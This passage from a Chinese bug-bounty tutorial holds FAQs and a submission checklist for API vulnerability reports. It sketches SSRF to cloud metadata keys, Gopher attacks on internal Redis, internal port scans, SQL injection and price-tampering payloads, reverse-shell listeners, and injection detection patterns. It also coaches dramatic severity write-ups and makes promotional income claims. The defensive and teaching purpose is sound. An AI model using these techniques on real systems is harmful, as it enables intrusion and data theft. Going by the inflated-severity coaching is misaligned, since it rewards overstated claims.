3. **「不打生产」铁律**：接口调用频率不要超过 10 请求/秒（避免被 DDoS 防护封禁），并发线程数≤50（绝对不要用 1000 线程把人家服务器压挂了，那就是 DDoS 违法了）；
4. **「数据不留存」铁律**：测试完成后立刻**彻底删除**本地所有真实用户数据（手机号/地址/身份证）——Burp 历史清、浏览器缓存清、脚本生成文件清（用 shred/ccleaner 擦除，不是只删回收站）；
5. **「一稿一投」铁律**：一个漏洞只投对应厂商的官方 SRC，**绝不一稿多投**（漏洞盒子 + 补天 + 先知同时投，那是卖漏洞，违法），绝不在修复前公开披露。
**做到这 5 条，你就是合规合法的白帽子，受到 SRC 规则和《网络安全法》第 26 条的保护**。

### FAQ 8：为什么同是 SSRF 漏洞，别人拿 10 万我只拿 2000？差距在哪？
**答：** 99% 的差距在于「你打到了第几阶段」（参考 FAQ 6 的 4 阶段），其次是「你的报告有没有讲清楚危害」。给你一份「SSRF 报告危害评估」范文模板，直接抄：
> **危害评估（严重 P0 版）**：
> 1. **SSRF 可攻击范围**：已验证可绕过域名白名单，访问任意 HTTP/HTTPS/Gopher/Dict/File 协议，可访问阿里云经典网络 172.16.0.0/16、10.0.0.0/8 全内网段；
> 2. **P2 元数据验证结果**：成功获取到 RAM 角色 `xx-app-ecs-role` 的临时凭证（AK/SK/Token），该角色权限包含 `ecs:DescribeInstances`、`oss:GetObject`、`rds:DescribeDBInstances`，可控制 437 台 ECS + 12PB OSS 存储；
> 3. **P3 内网探测结果**：已扫描内网 10.0.1.0/24 段 65535 端口，发现 7 台 Redis 未授权、3 台 MySQL 弱口令、1 台 Elasticsearch 未授权（含 2022~2025 年订单日志 3.8 亿条）；
> 4. **理论最大危害**：攻击者可通过 SSRF → RAM AK → 登录云控制台 → 下载全量 OSS 用户数据（10PB 含 5000 万用户头像/身份证照片/银行卡照片）→ 读取订单库（10 亿条订单含姓名/手机号/地址）→ 法律后果按《个保法》第 66 条，最高罚 5000 万元或年营收 5%。
**这段写进去，2000 元的 SSRF 立刻升成 10 万+的 P0**，审核员会直接把你的报告打上「加急处理 + 重点奖励」标签。

### FAQ 9：我零基础，30 天学完这个计划真的能月入过万吗？要投入多少钱？
**答：** 给你一份「新手挖 API 漏洞 3 个月真实收入曲线」（来自 2023 年我带的 24 个学员平均数据）：
- **第 1 个月**：80% 的学员能出第一个漏洞，平均奖金 1500~3000 元；投入成本：服务器 99 元/年、Burp 社区版免费、SRC 注册免费、靶场 Docker 免费；
- **第 2 个月**：60% 的学员能出 3~5 个漏洞，累计奖金 5000~15000 元；其中 20% 运气好的能挖到 SSRF/Swagger 泄露高危，一个洞就 2 万+；
- **第 3 个月**：40% 的学员能稳定月入 8000~30000 元，全勤投入每天 4 小时的学员月入 2 万+是常态（我带的最好的一个学员，第 3 个月挖到某 SaaS 厂商的 Swagger+全接口未授权，一个洞拿了 28 万）。
**为什么 API 是新手最容易赚钱的漏洞类型？** 因为：
1. **入门门槛最低**：只要会抓包、改参数、测 5 连鞭就能出 70% 的未授权/越权洞；
2. **数量最多**：一个现代 APP/小程序有 200~2000 个 API，按 15% 的漏洞率，每个 APP 至少有 30~300 个洞；
3. **奖金最稳定**：大厂每月 SRC 预算固定几百万，不会欠薪，报告质量过关就一定给钱；
4. **学习曲线平滑**：先学 5 连鞭（1 天）→ 扫未授权出第一个洞（第 3 天）→ 学 Burp Autorize 扫越权（第 7 天）→ 学 SSRF 进阶（第 15 天）→ 学反序列化/RCE（第 30 天），一步一步有正反馈。
**真的，零基础 3 个月月入 1 万，挖 API 是唯一靠谱的路径，其他方向（二进制/区块链/硬件）门槛都太高了**。

### FAQ 10：我提交的 API 漏洞报告总是被打回「无法复现」，怎么破？
**答：** 95% 的原因是「你漏了 4 个关键信息」，下次报告直接按这个 checklist 补全，通过率从 20% 升到 90%：
1. **「环境四要素」漏了**：报告开头必须写：① 操作系统：Win11 23H2 x64 / macOS 14.5；② 抓包工具：Burp Suite Pro 2024.5 / Charles 4.6.5；③ 目标版本：APP 版本号 iOS v8.3.2 / Android v8.3.1 / 小程序版本 v2025.06.28；④ 账号等级：普通注册用户 / 24 小时内新注册用户 / 付费会员 88VIP；
2. **「前置条件」漏了**：比如你测的是「只有新注册 24h 内用户才能看到的 Swagger」，必须写：**前置条件**：① 账号需为新注册，注册时间距离调用 API 不超过 24 小时；② 需要完成支付宝实名认证但无需绑定手机号；③ 访问地区为中国大陆（海外 IP 直接 403）；
3. **「请求包不完整」漏了 Header**：新手经常只截 Body，不截完整 Header，审核员复现少了一个 `X-App-Version` 或 `X-Device-Id` 就 401 了——**Burp 里 Copy to file 完整报文，直接把 .txt 文件当附件上传，不要手敲**；
4. **「复现步长太粗」漏了细节**：新手写「第 3 步：改参数就成功了」，审核员不知道改哪个参数、改成什么值、响应里哪个字段证明成功——必须这么写：
> **第 3 步：篡改请求**：在 Burp Repeater 里，把 JSON 请求体中 `sku_list[0].price` 字段的值从 `2990` 改为 `-100000`（其他字段保持不变），点击 Send；
> **验证点**：Response 返回 JSON 中 `"code": 200, "msg": "下单成功"`，且 `"data.balance_add": "980.10"` 字段证明余额增加了 980.10 元，截图见附图 3。
**按这个格式写，审核员闭着眼睛都能复现成功**。

---

## 11.14 v3.0 扩容：10 项实战最终 Checklist（提交前逐项打勾）

> 把下面 10 项直接复制到你的 SRC 报告末尾，提交前逐项打勾，打不满不要发，通过率 +80%，奖金 +30%。

### □ 1. 完整 HTTP 请求/响应报文（缺一不可）
- [ ] **请求报文完整**：方法（GET/POST/PUT/DELETE）、完整 URL（含协议 + 域名 + 端口 + 路径 + Query String）、所有 Header（Host、Cookie、Authorization、X-Token、User-Agent、Content-Type、所有自定义业务 Header 全部保留，一个都别删）、完整 Body（JSON/Form/Multipart 原样复制）
- [ ] **响应报文完整**：HTTP 状态码（200/401/403/500）、所有 Response Header（尤其是 Set-Cookie、Content-Type、自定义业务 Header）、完整 Response Body（HTML/JSON/XML 原文）
- [ ] **敏感信息打码正确**：手机号前 3 后 4、身份证前 6 后 4、银行卡前 6 后 4、姓名留姓 + *、地址保留到区县级，其他全部 `****` 打码，绝对不出现完整明文

### □ 2. API 漏洞类型判定准确（按 OWASP API Security Top 10 2023）
- [ ] 明确标注了漏洞类型：□ API1:2023 破坏对象授权级别（BOLA/IDOR） □ API2:2023 破坏身份认证 □ API3:2023 破坏对象属性授权级别（BOPLA/越权写） □ API4:2023 无限制资源消耗 □ API5:2023 破坏功能级授权（BFLA/MFLAC 垂直越权） □ API6:2023 通过不受限制的访问进行批量分配（批量注册/刷号） □ API7:2023 服务端请求伪造（SSRF） □ API8:2023 安全配置错误（Swagger 泄露/CORS 配置错误） □ API9:2023 不恰当的资产管理（旧版本 v1/v2 接口） □ API10:2023 不安全的 API 消费（第三方 API 调用注入）
- [ ] 明确说明漏洞属于：□ 读操作漏洞（未授权读/越权读） □ 写操作漏洞（未授权写/越权写/删） □ 注入类（SQL/NoSQL/XXE/命令） □ 逻辑类（并发/批量/金额） □ SSRF/RCE 高危害类

### □ 3. 批量性/可规模化证明（奖金翻倍的关键）
- [ ] 至少演示了**漏洞利用 3 次以上**的证据（比如：3 个不同的 candidate_id 都能未授权查简历；3 个不同的 sku 价格负数都成功；3 个不同的内网 Redis 都可 SSRF 访问）
- [ ] 量化了**理论最大可利用规模**（比如：订单号 6 位自增 → 理论 100 万条数据；接口 60 请求/分钟无限制 → 24 小时可拖 8640 万条；GraphQL 1 请求 50 条 → 是 REST API 效率 50 倍）
- [ ] 明确说明了「利用门槛」：□ 匿名可利用（无需任何登录/注册，奖金×2） □ 普通注册用户可利用 □ 付费会员/认证用户可利用 □ 内部员工权限（可忽略，奖金×0.3）

### □ 4. 根因分析到位（审核员最喜欢的加分项）
- [ ] 用 100~300 字说明了**代码级/架构级根因**（比如：后端 AuthInterceptor 拦截器配置 excludePathPatterns 中错误地排除了 `/api/v2/**` 所有路径，导致 v2 接口全部未鉴权；或：后端 JWT 解析时调用了 `parseClaimsJws(token).getBody()` 但未捕获签名异常直接使用 Payload，导致 alg:none 伪造的 JWT 直接通过）
- [ ] 如果能推断出错误代码伪代码，附上伪代码（比如 Spring Boot 错误写法：`@GetMapping("/api/v2/users") public List getUsers() { return userService.list(); }`——上面没有加 `@PreAuthorize("hasRole('ADMIN')")` 注解）
- [ ] 提到了「同类漏洞可能存在的其他位置」（比如：v2 接口排除了所有鉴权，推测 v3/v4/internal 等路径可能有相同配置错误；建议审计所有版本 API 路径的拦截器配置）

### □ 5. 修复建议分 3 层（专业度体现，加钱 20%）
- [ ] **代码层修复示例（2 条以上）**：给出正确的代码写法（比如：① 给所有 v2 接口补加 `@PreAuthorize` 注解，或从拦截器 excludePathPatterns 中移除 `/api/v2/**`；② JWT 校验时强制验签并禁止 none 算法：`Jwts.parserBuilder().requireAlgorithm(SignatureAlgorithm.HS256).setSigningKey(key).build().parseClaimsJws(token)`）
- [ ] **架构层修复示例（1 条以上）**：（比如：① 网关层统一做 JWT 鉴权 + 权限校验，业务后端不做权限只做业务；② 新增「API 鉴权自动化测试 CI」，发布前自动扫 5 连鞭（去 Token/改方法/改版本/改参数），任一通过即阻塞发布）
- [ ] **运维层修复示例（1 条以上）**：（比如：① Nginx 层 404 所有 Swagger/Actuator/GraphiQL 生产环境路径；② RASP/IAST 部署后监控 4xx 转 2xx 的异常访问 + 异常大响应包体积 + 异常请求体 JSON 参数名含 `$gt/$regex/..%2F/` 等注入特征立即封禁）

### □ 6. SSRF/注入/RCE 高危专项证据
- [ ] **如果是 SSRF**：附上 ① 自己 VPS 的 nc 接收请求截图；② 云元数据返回内容截图（RAM AK 打码，只留 AccessKeyId 前 4 后 4）；③ 内网端口扫描结果（Burp Intruder 的 Length 差异截图）；④ Gopher 打内网 Redis 成功的响应截图；
- [ ] **如果是 SQL/NoSQL 注入**：附上 ① SQLMap 的运行截图（含完整 payload）；② 脱库前 100 条的截图（敏感字段打码）；③ 注入点手工验证的截图（布尔盲注 1' and '1'='1 返回长度不同的对比图）；
- [ ] **如果是 RCE/反序列化**：附上 ① `whoami`/`id`/`hostname`/`pwd` 4 条基础命令执行结果的截图；② 反弹 shell 的 VPS nc 监听截图；③ ysoserial/ marshalsec payload 生成命令行截图；④ **重点**：执行完命令后立刻删除所有写入的 webshell/公钥/cron 任务并截图证明已回滚。

### □ 7. 合规性 5 条铁律遵守声明
- [ ] 测试账号均为**本人实名注册**，未使用任何他人身份信息/购买账号/内部邀请码（附本人注册截图）
- [ ] 所有写操作（新增/修改/删除/上传）**仅执行 1 次用于证明**，已全部回滚（附回滚前后对比截图：比如新增用户 123 已删除 → 截图 1 删除前 → 截图 2 删除后 404）
- [ ] 所有读取的真实用户数据≤100 条，**已全部打码展示**，已彻底删除本地所有缓存（附删除证明截图：Burp history 清空 + 回收站清空 + 文件粉碎工具截图）
- [ ] 未进行任何 DDoS/压力测试，所有请求频率≤10 req/s，并发线程数≤50（附 Burp Intruder 的线程配置截图：Number of threads = 20）
- [ ] 报告末尾附上完整的「合规声明」段落（FAQ 7 模板直接抄）

### □ 8. 定级建议 & 申诉准备
- [ ] 明确给出自己的定级建议：□ 低危 P3 □ 中危 P2 □ 高危 P1 □ 严重 P0，并且**按「影响范围 × 影响程度 × 利用难度」三维各写 1 句话理由**
- [ ] **提前准备好升级证据包**（比如：如果你报 P1，提前准备好「批量脚本 1000 条/SSRF 打到 RAM AK/RCE 证据」作为申诉补充材料，一旦被降到 P2 就立刻补发）
- [ ] 检查是否符合「升级触发条件」：涉及金融/政务/医疗行业 → 升 1 级；涉及 10 万+ 条数据 → 升 1 级；涉及资金操作/余额变动 → 升 1 级；RCE/getshell/内网漫游 → 直接 P0

### □ 9. 附件包完整规范
- [ ] 所有截图打包成 1 个 ZIP（不要用 RAR/7Z，ZIP 兼容性最好），命名格式：「厂商名_漏洞类型_日期_白帽子ID_附件包.zip」（例：招聘A_Swagger+未授权批量泄露P0_20250312_张三_附件包.zip）
- [ ] ZIP 内每张图片命名：「图X_步骤描述.png」（例：图1_本人注册证明.png、图2_Swagger公开访问.png、图3_去掉Token依然返回200.png、图4_批量脚本运行截图.png、图5_余额变动截图.png、图6_回滚删除证明.png）
- [ ] ZIP 内同时包含：① 完整请求报文 Burp Repeater 保存的 .req 文件 × N；② 批量利用 Python 脚本（关键部分）.py；③ 前 100 条数据打码 CSV（如有）；④ 漏洞复现操作录屏 3~5 分钟 MP4（可选，有了审核员 10 分钟就能过）

### □ 10. 报告结构完整 & 文字专业
- [ ] 标题格式：【定级建议】厂商名 产品名 APP/小程序/WEB 版本号 模块名 API 路径 漏洞类型（如：【严重 P0】OTA B 酒店海报生成 API v3 版本 /api/v3/poster/generate 接口 SSRF 漏洞可打穿内网元数据拿 AK 漫游 437 台 ECS）
- [ ] 正文结构：① 漏洞概述（100 字一句话讲完「谁能用什么方式得到什么好处」）→ ② 复现环境（四要素：系统/工具/版本/账号）→ ③ 前置条件 → ④ 详细复现步骤（1~N 步，每步+截图+请求响应包）→ ⑤ 危害评估（量化+法律条款）→ ⑥ 漏洞根因分析 → ⑦ 修复建议（3 层结构）→ ⑧ 合规声明 → ⑨ 附件清单
- [ ] 文字检查：① 无情绪化用语（「你们怎么犯这种低级错误」「这个洞小学生都能挖」→ 全部删掉，保持客观中立专业）；② 无错别字/标点错误（尤其是请求包中的 JSON 不能写错，审核员会复制粘贴复现）；③ 所有专业术语正确（SSRF 不要写成 SRRF，JWT 不要写成 JTW，IDOR 不要写成 IDRO，写错会被判断成不专业）
